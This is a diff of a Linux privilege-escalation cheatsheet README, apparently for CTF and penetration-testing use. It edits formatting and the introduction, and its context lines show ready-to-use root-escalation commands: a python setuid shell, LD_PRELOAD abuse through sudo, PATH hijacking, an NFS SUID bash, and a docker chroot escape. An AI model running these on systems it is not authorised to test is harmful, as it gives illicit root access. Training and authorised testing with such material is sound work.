@@ -1,5 +1,7 @@
 # linux-privilege-escalation-cheatsheet
-Simple guide of series of command and action to test the machine and get the access as root
+This is a practical cheatsheet for Linux Privilege Escalation, ordered by priority.  
+It is intended for Capture The Flag (CTF) exercises, penetration testing, and red team operations.  
+Each section includes examples and ready-to-use commands.
 
 General Info & Enumeration
 Always perform this first: identify running processes, open ports, users, and interesting files to find escalation opportunities.
@@ -24,14 +26,14 @@ sudo -l
 
 --------------------------------------------------------------------------------------
 
-# SUDO
+# **SUDO**
 Allows executing commands with elevated privileges if permitted in the sudoers file.
 sudo -l
 If a binary is listed, search it on GTFOBins.
 
 --------------------------------------------------------------------------------------
 
-# SUID (Set User ID)
+# **SUID (Set User ID)**
 Binaries that run with root privileges even when executed by unprivileged users.
 
 find / -perm -4000 -type f 2>/dev/null
@@ -40,7 +42,7 @@ Check each binary on GTFOBins for known exploits.
 
 --------------------------------------------------------------------------------------
 
-# Capabilities
+# **Capabilities**
 Check if regular binaries have special capabilities like cap_setuid, which allow privilege escalation.
 
 getcap -r / 2>/dev/null
@@ -50,7 +52,7 @@ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
 --------------------------------------------------------------------------------------
 
-# LD_PRELOAD / LD_LIBRARY_PATH
+# **LD_PRELOAD / LD_LIBRARY_PATH**
 Advanced technique using environment variables and sudo to run arbitrary code.
 
 Check if LD_PRELOAD is allowed:
@@ -79,7 +81,7 @@ sudo LD_PRELOAD=/tmp/lib.so find
 
 --------------------------------------------------------------------------------------
 
-# Cron Jobs
+# **Cron Jobs**
 Scheduled scripts executed by root. If editable, they are exploitable.
 
 cat /etc/crontab
@@ -90,7 +92,7 @@ Check if any scheduled scripts are writable or vulnerable to PATH hijacking.
 
 --------------------------------------------------------------------------------------
 
-# Weak File Permissions
+# **Weak File Permissions**
 Critical files like /etc/shadow or /etc/passwd with unsafe permissions may allow hash reading or user modification.
 
 find / -writable -type f -user root 2>/dev/null
@@ -99,7 +101,7 @@ cat /etc/passwd
 
 --------------------------------------------------------------------------------------
 
-# PATH Hijacking
+# **PATH Hijacking**
 If a script executed by root uses commands without absolute paths, you can hijack the PATH to run your own version.
 
 echo "/bin/bash" > cp
@@ -109,7 +111,7 @@ export PATH=.:$PATH
 
 --------------------------------------------------------------------------------------
 
-# NFS Misconfiguration
+# **NFS Misconfiguration**
 If an NFS share is mounted with no_root_squash, you can upload SUID binaries and execute them remotely.
 
 showmount -e <IP>
@@ -119,7 +121,7 @@ chmod +s /mnt/backup/rootbash
 
 --------------------------------------------------------------------------------------
 
-# Docker Misconfiguration
+# **Docker Misconfiguration**
 If the user is in the docker group, they can access the host by running privileged containers.
 
 id  # Check if you're in the docker group
@@ -127,7 +129,7 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 
 --------------------------------------------------------------------------------------
 
-# Kernel Exploits
+# **Kernel Exploits**
 Last resort. Use known exploits against vulnerable kernels (e.g., Dirty COW, OverlayFS).
 
 uname -a
